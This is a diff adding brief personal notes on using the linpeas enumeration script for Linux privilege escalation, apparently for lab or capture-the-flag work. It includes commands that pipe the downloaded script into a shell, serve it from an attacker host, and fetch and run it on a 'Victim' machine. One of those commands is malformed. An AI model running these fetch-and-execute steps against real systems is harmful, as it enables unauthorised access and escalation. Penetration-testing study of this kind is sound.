@@ -1,0 +1,16 @@
+linpeas used for priviledge escalations
+
+# Download From github
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# Local network
+sudo python3 -m http.server 80 #Host
+
+cd tmp
+
+curl | wget 10.10.10.10/linpeas.sh | sh #Victim
+
+
+chmod +x linpeas.sh
+
+GTFOBins-website
